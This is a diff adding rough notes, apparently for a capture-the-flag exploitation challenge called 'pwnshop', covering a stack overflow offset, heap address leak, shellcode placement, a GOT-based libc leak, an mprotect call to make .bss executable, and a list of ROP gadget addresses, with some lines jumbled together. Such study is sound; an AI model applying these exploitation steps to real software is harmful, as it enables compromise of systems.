@@ -1,0 +1,111 @@
+socat TCP4-LISTEN:31337,reuseaddr,fork EXEC:"./pwnshop"
+
+FUN 0010132a - stack size 0x48
+80 bytes to overwrite saved RIP
+
+Send 2, AA - set price to 12345678 to leak heap address 
+
+Send 2, AA - set price to 13.37 to write shellcode to heap
+
+Send 1, 72 bytes+heap address to overwrite saved RIP
+
+
+
+
+
+Base = 0x55a2068830c0 - 0x40c0
+Puts = Base + 0x4018
+
+
+
+
+
+0x30c0- 0x40c0+ 0x4018
+
+
+GOT has PLT address before function name is resolved.
+Once resolved, GOT has function address during runtime
+
+So calling puts(GOT entry of puts) effectively leaks its resolved address.
+
+
+libc6_2.31-17
+mprotect 00000000000f8c20
+
+.bss offset 0x4080 size 0x80, can write 0x40 to this region
+
+
+RDI = base + 0x4080 <address of .bss>
+RSI = 0x80	  <size of .bss>
+RDX = 0x04	PROT_EXEC
+
+Mprotect = libc_base + 0xf8c20	
+
+	
+
+
+
+0x0000000000038d1b : add eax, ebp ; pop rdi ; ret
+
+0x00000000000fddeb : pop rax ; pop rdi ; call rax
+
+0x00000000001376e1 : pop rax ; pop rdx ; pop rbx ; ret
+
+0x000000000003ee88 : pop rax ; ret
+
+0x000000000002890f : pop rsi ; ret
+
+0x00000000000f948a : mov rax, r12 ; pop rdx ; pop r12 ; ret
+
+0x00000000000f948b : mov eax, esp ; pop rdx ; pop r12 ; ret
+
+
+0x00000000001376e1 : pop rax ; pop rdx ; pop rbx ; ret
+
+
+0x00000000000cb1cd : pop rdx ; ret
+
+0x000000000002890f : pop rsi ; ret
+
+0x00000000000fadf9 : pop rsi ; call rax
+
+0x000000000010add6 : adc al, 0x74 ; or eax, 0x41c0315b ; pop rsp ; pop rbp ; ret
+
+0x0000000000026ec8 : xchg eax, ebp ; ret
+
+0x000000000011d883 : adc byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; 
+
+0x0000000000060403 : adc ecx, dword ptr [rcx + 0x415d5b28] ; pop rsp ; ret
+
+
+0x0000000000090988 : add byte ptr [r8], r8b ; add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; ret
+
+0x00000000000350b9 : add byte ptr [rax - 0x75], cl ; pop rsp ; ret
+
+
+
+0x00000000000d56f2 : and al, 0x41 ; pop rsp ; ret
+
+
+0x0000000000026e9b : pop rsp ; ret
+
+
+retbss_addr
+pop_rdi0x000000000003c361 : add byte ptr [rbp + 0x41], bl ; pop rsp ; retpop_rax
+pop_rsi
+pop_rax
+pop_rdx
+
+
+0x208  - 0x28 - ret pops addr off stack; esp + 8 as a result
+
+
+ROP tools
+
+1. RORgadget
+2. Ropper
+3. Ropium - compiler, python library
+
+
+
+
